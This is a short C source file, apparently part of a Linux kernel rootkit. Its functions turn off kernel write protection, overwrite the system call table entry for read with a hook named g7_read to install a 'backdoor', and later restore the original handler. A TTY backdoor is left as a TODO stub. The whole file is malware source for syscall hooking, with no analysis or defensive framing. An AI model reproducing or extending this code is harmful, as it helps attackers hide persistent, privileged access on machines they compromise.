#include "common.h"
#include "backdoor.h"
#include "hook.h"

void
backdoor_read(void)
{
    disable_protection();
    sys_calls[__NR_read] = (void *)g7_read;
    enable_protection();
}

void
backdoor_tty(void)
{
    disable_protection();
    // TODO
    enable_protection();
}

void
disable_backdoor(void)
{
    disable_protection();
    sys_calls[__NR_read] = (void *)sys_read;
    enable_protection();
}
